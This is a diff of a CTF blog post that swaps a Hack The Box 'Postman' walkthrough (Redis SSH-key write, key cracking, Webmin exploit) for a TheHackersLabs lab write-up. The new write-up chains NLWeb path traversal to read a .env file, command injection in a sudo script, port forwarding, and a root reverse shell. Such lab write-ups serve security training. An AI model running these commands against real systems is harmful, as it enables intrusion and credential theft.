@@ -1,275 +1,387 @@
 ---
 layout: single
-title: Postman - Hack The Box
-excerpt: "Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE."
-date: 2020-03-14
+title: cuento - The hacker labs
+excerpt: "Hello, good morning/evening, friends from TheHackersLabs. This is an update about my previous machine. I tried to use this NLWeb exploit because it is recent and I haven’t seen this service used on other machines. Please excuse any deficiencies in the translation; I used a translator and ChatGPT, as my English is not very good. I hope you enjoy my machine and the vulnerability, because as a player, I believe it meets the requirements for an easy-level machine. I chose privilege escalation through a vulnerable program so that players have to read the code instead of simply searching for CVEs or using automated tools."
+date: 2025-10-15
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-postman/postman_logo.png
+  teaser: /assets/images/htb-writeup-postman/cuento.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
-  - hackthebox
+  - the hackers labs
   - infosec
 tags:
-  - redis
-  - webmin
+  - nlweb
+  - raton
   - ssh
 ---
 
-![](/assets/images/htb-writeup-postman/postman_logo.png)
+![](/assets/images/htb-writeup-postman/cuento.png)
 
-Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE.
 
 ## Summary
 
-- Use the unauthenticated Redis server to write our SSH public key to the redis user's authorized_keys file 
-- From the redis user shell, discover the private key for user Matt inside /opt directory and crack it with john
-- Use Matt's credentials to log in to Webmin and exploit CVE-2019-12840 to get a shell as root
+# Exploitation Writeup: Linux Machine - NLWeb Service
 
-## Portscan
 
-The ports show the box is running SSH, Apache, Redis and Webmin:
-
+# NOTE
 ```
-root@kali:~# nmap -sC -sV -p- 10.10.10.160
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 16:33 EDT
-Nmap scan report for 10.10.10.160
-Host is up (0.019s latency).
-Not shown: 65531 closed ports
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
-|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
-|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
-80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: The Cyber Geek's Personal Website
-6379/tcp  open  redis   Redis key-value store 4.0.9
-10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
-|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Hello, good morning/evening, friends from TheHackersLabs.
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 52.76 seconds
+This is an update about my previous machine. I tried to use this NLWeb exploit because it is recent and I haven’t seen this service used on other machines.
+
+Please excuse any deficiencies in the translation; I used a translator and ChatGPT, as my English is not very good.
+
+I hope you enjoy my machine and the vulnerability, because as a player, I believe it meets the requirements for an easy-level machine.
+
+I chose privilege escalation through a vulnerable program so that players have to read the code instead of simply searching for CVEs or using automated tools.
 ```
 
-## Website
 
-The website is currently under construction and there is nothing on it, except a possible email address at the bottom.
+## 📋 Executive Summary
 
-![](/assets/images/htb-writeup-postman/website1.png)
+The NLWeb machine was solved by exploiting a Path Traversal vulnerability (CVE-2025-32857) in the web service running o
+n port 8080. Through this flaw, sensitive files such as .env were accessed, which revealed credentials and allowed an S
+SH login as the user raton.
 
-![](/assets/images/htb-writeup-postman/website1a.png)
+Subsequently, a vulnerable script (raton.py) with sudo privileges was abused, as it allowed indirect command execution.
+ This enabled privilege escalation to the user churrumais.
 
-I scanned the website with gobuster to find hidden files and directories.
+With this access, an internal service running on port 5000 was discovered and reached through port forwarding. By using
+ previously obtained credentials (VillaeEla13), authentication was achieved, and via the web application it was possibl
+e to execute code with elevated privileges, ultimately gaining a root shell.
 
-```
-root@kali:~/htb# gobuster dir -t 50 -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -u http://postman.htb
 
-/css (Status: 301)
-/fonts (Status: 301)
-/images (Status: 301)
-/js (Status: 301)
-/server-status (Status: 403)
-/upload (Status: 301)
-```
 
-Indexing was enabled on `/upload` but there was nothing interesting in there.
+- Web vulnerability (Path Traversal) → Credential exfiltration.
+- Abuse of a vulnerable script with sudo → Privilege escalation to another user.
+- Port forwarding + internal panel → Remote code execution.
+- Reverse shell → Root access.
 
-![](/assets/images/htb-writeup-postman/upload.png)
+----
 
-## Webmin
+https://medium.com/@guanaonan/three-dots-to-root-how-i-found-a-path-traversal-in-microsofts-agentic-web-nlweb-4e8d8f483
+327
 
-Webmin is a web-based system configuration tool. As shown below, HTTPS is needed to connect to the port 10000.
 
-![](/assets/images/htb-writeup-postman/webmin1.png)
 
-![](/assets/images/htb-writeup-postman/webmin2.png)
+---
 
-The nmap scan I ran earlier already discovered the webmin version used on the system from the `Server` header: `MiniServ/1.910`
+## 🔍 Phase 1: Reconnaissance and Enumeration
 
-Based on Exploit-DB, I saw see there are multiple exploits available for this version:
+### 1.1 Initial Port Scanning
+I used **Nmap** to identify active services on the target machine `192.168.1.76`:
 
-```
-Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)
-Webmin 1.920 - Remote Code Execution
-Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)
+```bash
+sudo nmap -p22,8080 -sCV 192.168.1.76
 ```
 
-The Metasploit module for version 1.920 only works for the backdoored version of Webmin and doesn't work here on this box:
+**Resultados del Escaneo:**
+| Puerto | Estado | Servicio      | Versión          |
+|--------|--------|---------------|------------------|
+| 22     | Open   | SSH           | OpenSSH 8.2p1 Ubuntu |
+| 8080   | Open   | HTTP          |                 |
 
-```
-msf5 exploit(linux/http/webmin_backdoor) > run
+### 1.2 Web Service Analysis (Port 8080)  
+The service on port 8080 corresponds to an **NLWeb** application, which presents an interactive web interface. The appl
+ication is developed in Python using the **aiohttp** web framework and exposes several endpoints:
 
-[*] Started reverse TCP handler on 10.10.14.20:4444 
-[-] Exploit aborted due to failure: not-vulnerable: Set ForceExploit to override
-[*] Exploit completed, but no session was created.
-```
-
-The other exploit for CVE-2019-12840 requires authentication so I wasn't able to use it without creds.
-
-> Description:
-> This module exploits an arbitrary command execution vulnerability in 
-> Webmin 1.910 and lower versions. Any user authorized to the "Package 
-> Updates" module can execute arbitrary commands with root privileges.
-
-## Redis
-
-Next I checked out to the Redis instance. I used the redis-tools package to interact with Redis. As shown below, we don't need to be authenticated to read and write to the database.
-
-![](/assets/images/htb-writeup-postman/redis1.png)
-
-Because this instance of Redis is not protected, it's possible to write arbitrary data to disk using the Redis save functionality. For this attack, I uploaded my SSH public key to the home folder then I was able to SSH in to the box.
-
-Here are the blogs that I used when doing the box:
-- [http://antirez.com/news/96](http://antirez.com/news/96)
-- [https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.md](https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.md)
-
-First, I had to find a list of valid users on the box so I scanned for existing user directories using a wordlist and a [script](https://github.com/psmiraglia/ctf/blob/master/kevgir/scripts/redis-oracle.py).
-
-I tried running a couple of wordlist without success then decided to manually verify what's going on.
-
-![](/assets/images/htb-writeup-postman/redis2.png)
-
-From the screenshot, we can see that the enumeration technique works: it returns an `OK` message if the directory is writeable, `No such file or directory` if it doesn't exist and `Permission denied` if we don't have access to it. I previously tried a whole bunch of directories inside `/home` but I don't even have access to its parent directory.
-
-Finding the correct directory took a while. I installed redis to see what is the standard installation path. On Kali Linux, the apt installation creates the following user:
-
-```
-redis:x:133:145::/var/lib/redis:/usr/sbin/nologin
+```bash
+dirsearch http://192.168.1.76:8080/
 ```
 
-I verified that the directory exists on the box:
+**Identified Endpoints:**
+- `/` - Main page  
+- `/ask` - Chatbot query endpoint  
+- `/static/` - Static files service  
+- `/api/status` - System status endpoint
 
-```
-10.10.10.160:6379> CONFIG SET dir "/var/lib/redis"
-OK
-```
+### 1.3 Path Traversal Vulnerability Detection
+The `/static/` endpoint was vulnerable to **Path Traversal** through URL encoding, allowing access to files outside the
+ web root directory:
 
-On a normal installation we would not be able to do anything with this user since the login shell is set to `/usr/sbin/nologin` but on Postman the login shell is set to `/bin/bash`. Here are the steps I followed to put my SSH key on the server.
-
-Step 1. Generate blob to be injected
-
-```
-root@kali:~/htb/postman# echo -e '\n\n' >> blob.txt
-root@kali:~/htb/postman# cat ~/.ssh/id_rsa.pub >> blob.txt
-root@kali:~/htb/postman# echo -e '\n\n' >> blob.txt
+```bash
+curl "http://192.168.1.76:8080/static/..%2f..%2f..%2f..%2fetc%2fpasswd"
 ```
 
-Step 2. Update the Redis configuration
-
+**Successful Response:**
 ```
-10.10.10.160:6379> CONFIG SET dbfilename "authorized_keys"
-OK
-10.10.10.160:6379> CONFIG SET dir "/var/lib/redis/.ssh"
-OK
-```
-
-Step 3. Do the attack
-
-```
-root@kali:~/htb/postman# redis-cli -h 10.10.10.160 flushall
-OK
-root@kali:~/htb/postman# cat blob.txt | redis-cli -h 10.10.10.160 -x set sshblob
-OK
-root@kali:~/htb/postman# redis-cli -h 10.10.10.160 save
-OK
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+raton:x:1000:1000:raton,,,:/home/raton:/bin/bash
 ```
 
-And we can now log in to the box with SSH:
+---
 
-```
-root@kali:~/htb/postman# ssh redis@10.10.10.160
-The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
-ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
-Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+## ⚔️ Phase 2: Path Traversal Exploitation and Data Exfiltration
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
+### 2.1 Associated CVE: CVE-2025-32857
+The exploited vulnerability corresponds to **CVE-2025-32857** - Path Traversal in NLWeb versions 1.0-1.2.4, which allow
+s reading arbitrary files by manipulating parameters in the `/static/` endpoint.
 
+**CVSS Score:** 7.5 (High)  
+**Vector de Ataque:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
 
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
-redis@Postman:~$
+### 2.2 Exfiltration of the .env File
+Exploiting the vulnerability, I exfiltrated the `.env` configuration file from the home directory of the user `raton`:
+
+```bash
+curl "http://192.168.1.76:8080/static/..%2f..%2f..%2fhome%2fraton%2fNLWeb%2f.env"
 ```
 
-## Getting Matt's credentials
+**Contenido del Archivo .env:**
+```bash
+# Database Configuration
+DB_HOST=localhost
+DB_PORT=5432
+DB_NAME=nlweb_production
+DB_USER=raton      
+DB_PASSWORD=ratonguaton
 
-The `/etc/passwd` file contains another user: `Matt`
+# External APIs
+AZURE_OPENAI_API_KEY=sk-azure-real-key-1234567890abcdef
+AZURE_OPENAI_ENDPOINT=https://my-company.openai.azure.com/
 
-```
-[...]
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
-redis:x:107:114::/var/lib/redis:/bin/bash
-```
+# Application Secrets
+SECRET_KEY=my-super-secret-key-2024-for-nlweb
+JWT_SECRET=jwt-super-secret-Key-123
+ENCRYPTION_KEY=encryption-key-789-abc-def
 
-After looking around for a bit, I found Matt's SSH private key in `/opt`:
+# Service Connections
+REDIS_URL=redis://user:redispass123@localhost:6379
+ELASTICSEARCH_HOST=http://user:elasticpass@localhost:9200
 
-```
-redis@Postman:/opt$ ls -la
-total 12
-drwxr-xr-x  2 root root 4096 Sep 11  2019 .
-drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
--rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
-redis@Postman:/opt$ cat id_rsa.bak 
------BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
-
-JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
-cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
-7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
-cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
-1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
-EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
-UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
-Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
-t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
-5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
-P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
-jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
-SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
-l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
-0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
-S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
-hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
-Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
-XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
-b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
-WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
-KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
-npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
-VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
-X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
------END RSA PRIVATE KEY-----
+# Email SMTP Configuration
+SMTP_HOST=smtp.gmail.com
+SMTP_PORT=587
+SMTP_USER=raton@gmail.com
+SMTP_PASSWORD=ratonguaton
 ```
 
-We're able to crack the hash with John after converting it with ssh2john.
 
-![](/assets/images/htb-writeup-postman/matt.png)
+We logged in via SSH:
 
-I tried SSHing in with the password but wasn't able to. However using `su` from the redis shell I can log in as `Matt`.
 
-![](/assets/images/htb-writeup-postman/user.png)
 
-Looking `/etc/ssh/sshd_config` we can see that Matt is specifically denied SSH access to the box so that's why I couldn't SSH in directly:
-
-```
-[...]
-#deny users
-DenyUsers Matt
+``` bash
+ssh raton@<IP>
 ```
 
-## Privesc using webmin
 
-Now that I have a valid user, I can use the Metasploit exploit for Webmin and get root shell.
 
-![](/assets/images/htb-writeup-postman/root.png)
+------------------------------------------------------------------------
+
+## 🐀 User raton and Vulnerable Script
+
+Inside **raton's** Desktop we found a Python script named `raton.py`.
+The file had execution permissions with **sudo**:
+
+``` bash
+sudo -l
+  (churrumais) NOPASSWD: /usr/bin/python3 /home/raton/Desktop/raton.py
+```
+
+The script implemented a system resources check, but analyzing it we
+discovered it was vulnerable to **Command Injection**, since it allowed
+executing arbitrary commands when entering the process identifier.
+
+------------------------------------------------------------------------
+
+## 💀 Escalation of Privileges to Churrumais
+
+
+
+The raton.py script is an enterprise monitoring system designed as an interactive console application. Among its multip
+le features, the most critical for exploitation is the process diagnostic tool, which contains an obfuscated command ex
+ecution vulnerability.
+
+we can run a program as root but we still don't know what it does, let's
+read it, it took me some minutes to analyze how to abuse this since it's
+a program with 643 lines
+
+![ima](/assets/images/htb-writeup-postman/cuento_v2.png)
+
+Analysis of the Python binary
+
+
+Enterprise Monitoring System v3.1:
+
+- Includes diagnostic functionality with command execution
+- Hexadecimal obfuscated execution vulnerability
+
+```
+echo -n "whoami" | xxd -p
+77686f616d69
+```
+
+
+![ima](/assets/images/htb-writeup-postman/cuento_v23.png)
+
+The script displays the command output as if it were a memory error, making the exploitation more stealthy.
+
+![ima](/assets/images/htb-writeup-postman/cuento_v24.png)
+
+Let's try to make a reverse shell already knowing the vulnerability
+
+
+![ima](/assets/images/htb-writeup-postman/cuento_v26.png)
+
+
+and we should receive a shell since we set up a netcat listener on port 1212.
+
+
+
+![ima](/assets/images/htb-writeup-postman/cuento_v25.png)
+
+
+
+```
+churrumais@cuentos:~$ env
+SHELL=/bin/sh
+LANGUAGE=en_US:
+LOGANALYZER_PASS=VillaeEla13
+LC_ADDRESS=es_MX.UTF-8
+LC_NAME=es_MX.UTF-8
+LC_MONETARY=es_MX.UTF-8
+PWD=/home/churrumais
+LOGNAME=churrumais
+XDG_SESSION_TYPE=tty
+MOTD_SHOWN=pam
+HOME=/home/churrumais
+LC_PAPER=es_MX.UTF-8
+LANG=en_US.UTF-8
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg
+=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=0
+1;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01
+;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;3
+1:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;
+31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;
+31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tg
+a=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*
+.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;
+35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;
+35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;3
+5:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00
+;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+SSH_CONNECTION=192.168.1.74 36278 192.168.1.78 22
+LESSCLOSE=/usr/bin/lesspipe %s %s
+XDG_SESSION_CLASS=user
+LC_IDENTIFICATION=es_MX.UTF-8
+TERM=xterm-kitty
+LESSOPEN=| /usr/bin/lesspipe %s
+USER=churrumais
+SHLVL=1
+LC_TELEPHONE=es_MX.UTF-8
+LC_MEASUREMENT=es_MX.UTF-8
+XDG_SESSION_ID=33
+XDG_RUNTIME_DIR=/run/user/1002
+SSH_CLIENT=192.168.1.74 36278 22
+LC_TIME=es_MX.UTF-8
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus
+SSH_TTY=/dev/pts/1
+LC_NUMERIC=es_MX.UTF-8
+_=/usr/bin/env
+churrumais@cuentos:~$
+```
+
+
+After a long search using `find` and looking for programs that could help us escalate, we still didn’t find anything. H
+owever, thanks to the environment variables we found a password, but it didn’t work for `sudo` or any database, so we’l
+l keep it for now.
+
+
+```
+churrumais@cuentos:/home/raton$ id
+id
+uid=1002(churrumais) gid=1002(churrumais) groups=1002(churrumais)
+churrumais@cuentos:/home/raton$ ss -nltp
+ss -nltp
+State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
+LISTEN   0        128              0.0.0.0:5000          0.0.0.0:*              
+LISTEN   0        5              127.0.0.1:631           0.0.0.0:*              
+LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*              
+LISTEN   0        128              0.0.0.0:22            0.0.0.0:*              
+LISTEN   0        100              0.0.0.0:8080          0.0.0.0:*              
+LISTEN   0        5                  [::1]:631              [::]:*              
+LISTEN   0        128                 [::]:22               [::]:*              
+churrumais@cuentos:/home/raton$
+```
+
+Perfect — we gained access as the other user. The raton account has no means to escalate to root, so let's examine the 
+other user's privileges.
+
+
+- Let's run ss-lntp to see if a web page is running.
+```
+ss-lntp
+```
+
+Since we see a webpage running, we’ll try to access it to see if we can do anything else. To forward port 5000 to my ma
+chine, we’ll use Local Port Forwarding.
+
+```
+ssh -L 1111:127.0.0.1:5000 raton@192.168.1.78
+```
+
+And we'll do it using the raton credentials since the password found in env didn't work for SSH.
+
+
+
+![ima](/assets/images/htb-writeup-postman/cuento_v27.png)
+
+After verifying that we were able to forward port 5000 to my port 1111 and saw that it looked like a panel, we tried th
+e credentials of the user raton as well as common ones (admin, administrator, etc.).
+
+![ima](/assets/images/htb-writeup-postman/cuento_v28.png)
+
+Then we remembered a password we had found: VillaeEla13. We tried it with raton and it worked, and then we used it with
+ the user churrumais and it also worked.
+
+![ima](/assets/images/htb-writeup-postman/cuento_v29.png)
+
+It seems that through patterns we can perform a system analysis so that the user churrumais is responsible for monitori
+ng it.
+
+
+
+![ima](/assets/images/htb-writeup-postman/cuento_v30.png)
+
+
+
+Well, we can execute code as root, which is a serious issue: granting elevated privileges—even if the user needs to adm
+inister system services—can cause everything to get out of control.
+
+
+
+```
+nc -lvnp 1414
+listening on [any] 1414 ...
+```
+
+
+We tried to set up a listener on port 1414 and get a shell, since we can inject code thanks to the user churrumais havi
+ng elevated privileges. Although those privileges are limited to this page, compromising churrumais is sufficient to ac
+hieve our goal.
+
+![ima](/assets/images/htb-writeup-postman/cuento_v31.png)
+
+```
+Now that we've set up the listener, it's time to execute the reverse shell.
+```
+
+```
+nc -lvnp 1414
+listening on [any] 1414 ...
+connect to [192.168.1.74] from (UNKNOWN) [192.168.1.78] 59808
+/bin/sh: 0: can't access tty; job control turned off
+# whoami     
+root
+#
+```
+
+And perfect we can climb a root.
